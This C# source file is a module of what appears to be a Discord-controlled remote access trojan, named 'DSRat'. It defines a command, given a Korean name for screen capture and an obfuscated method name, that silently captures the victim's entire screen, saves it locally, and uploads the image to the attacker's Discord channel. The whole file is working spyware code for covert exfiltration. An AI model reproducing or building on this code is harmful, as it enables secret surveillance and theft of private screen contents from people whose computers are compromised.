using Discord.Commands;
using System.Drawing;
using System.Threading.Tasks;
using System;
using System.Windows;
using System.Drawing.Imaging;

namespace DSRat
{
    public class Screen : ModuleBase<SocketCommandContext>
    {
        [Command("화면캡처")]
        public async Task ascascasy71SNDAKJSBK34y2979ui3yu1i()
        {
            int width = (int)SystemParameters.PrimaryScreenWidth;
            int height = (int)SystemParameters.PrimaryScreenHeight;

            using(Bitmap bmp = new Bitmap(width, height, PixelFormat.Format32bppArgb))
            {
                using (Graphics gr = Graphics.FromImage(bmp))
                {
                    gr.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                }
                string path = Environment.GetFolderPath(System.Environment.SpecialFolder.MyPictures);
                path += "\\" + DateTime.Now.ToString("yyMMdd_HHmmss") + ".png";

                bmp.Save(path);
                await Context.Channel.SendFileAsync(path);
            }
        }
    }
}
